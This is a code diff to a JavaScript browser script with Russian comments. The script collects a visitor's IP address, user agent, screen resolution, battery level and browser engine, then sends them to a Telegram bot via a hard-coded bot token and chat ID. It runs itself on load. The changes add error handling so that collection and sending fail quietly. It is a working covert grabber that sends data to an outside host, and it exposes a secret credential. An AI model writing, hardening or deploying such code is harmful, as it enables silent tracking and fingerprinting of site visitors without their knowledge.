@@ -1,7 +1,13 @@
 async function getIPAddress() {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        if (!response.ok) throw new Error('Ошибка сети при получении IP');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error('Ошибка получения IP-адреса:', error);
+        return 'Не удалось получить IP';
+    }
 }
 
 function getUserAgent() {
@@ -17,8 +23,13 @@ function getScreenResolution() {
 }
 
 async function getBatteryPercentage() {
-    const battery = await navigator.getBattery();
-    return Math.floor(battery.level * 100);
+    try {
+        const battery = await navigator.getBattery();
+        return Math.floor(battery.level * 100);
+    } catch (error) {
+        console.error('Ошибка получения информации о батарее:', error);
+        return 'Не удалось получить данные о батарее';
+    }
 }
 
 function getBrowserInfo() {
@@ -64,19 +75,23 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
     `;
 
-    const token = '7159693608:AAH9PgIOO7AJja_tqq4g8IdGbGMPw-Q1Ajg';
+    const token = '7159693608:AAH9PgIOO7AJja_tqq4g8IdGbGMPw-Q1Ajg'; // Не забудьте хранить токен безопасно
     const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
-    const chatId = '-1002005164665';
+    const chatId = '-1002005164665'; // Храните ID чата безопасно
 
     const formData = new FormData();
     formData.append('chat_id', chatId);
     formData.append('text', message);
     formData.append('parse_mode', 'HTML');
 
-    await fetch(telegramBotURL, {
-        method: 'POST',
-        body: formData
-    });
+    try {
+        await fetch(telegramBotURL, {
+            method: 'POST',
+            body: formData
+        });
+    } catch (error) {
+        console.error('Ошибка отправки данных в Telegram:', error);
+    }
 }
 
 sendDataToTelegram();
